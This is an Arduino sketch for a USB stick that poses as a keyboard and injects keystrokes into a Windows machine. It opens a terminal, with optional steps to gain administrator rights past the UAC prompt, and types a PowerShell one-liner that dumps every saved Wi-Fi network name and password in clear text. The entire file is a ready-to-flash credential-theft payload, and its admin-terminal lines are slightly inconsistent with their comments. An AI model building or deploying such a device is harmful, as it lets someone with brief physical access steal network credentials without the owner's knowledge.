#include <Arduino.h>
#include <DigiKeyboardMultilang.h>
#include <extendedLanguages.h>  // ExtendedLanguages - provides lang_de, lang_fr, lang_gr so far

DigiKeyboardMultilang keyboard(lang_de); // IMPORTANT Declare keyboard layout! e.g., lang_us for US English

const char* runCmdPld = "netsh wlan show profiles|sls 'All.*P\\w*\\s*:\\s*(.+)$'|%{$n=$_.Matches[0].Groups[1].Value.Trim();$p=(netsh wlan show profile name=\"$n\" key=clear|sls 'K\\w*\\s*C\\w*\\s*:\\s*(.+)$').Matches[0].Groups[1].Value.Trim();\"${n}:$p\"} 2>$null|sort -Unique"; // dump wifi creds in PowerShell terminal example

int redLED = 1;

void setup() {
    pinMode(redLED, OUTPUT); // Initialize the RED LED pin as an output
    digitalWrite(redLED, HIGH); // Turn on the RED LED while executing payload
    
    // --- THE HID INJECTION STARTS HERE ---
    keyboard.delay(6000); // Wait 6 seconds to allow the OS to recognize the device and install drivers if needed
    keyboard.sendKeyStroke(KEY_X, KEY_MOD_GUI); // Win+X (KEY_MOD_GUI = Windows/Command key)
    keyboard.delay(1200); // Wait 1.2 seconds for the run dialog to open
    keyboard.println("i"); // Open a terminal window
    // comment the line above & uncomment the following lines to run terminal as admin
    keyboard.println("a"); // Open a terminal windows as administrator
    // keyboard.delay(1200); // Wait 1.2 seconds for the terminal to open
    // keyboard.sendKeyStroke(KEY_LEFT); // Select 'Yes' on UAC prompt
    // keyboard.delay(800); // Wait 800 milliseconds for the UAC prompt to appear
    // keyboard.sendKeyStroke(KEY_ENTER); // Enter to confirm UAC and open terminal
    keyboard.delay(5000); // Wait 5 seconds for the terminal to open
    keyboard.println(runCmdPld); // type payload to dump wifi creds in PowerShell terminal example
    // --- THE HID INJECTION ENDS HERE ---
    
    digitalWrite(redLED, LOW); // Turn off the RED LED after executing payload
}

void loop() {
    // the loop function is intentionally left empty But if you want to repeat the payload,
    // you can add code here with your desired logic and delays instead of in setup().
}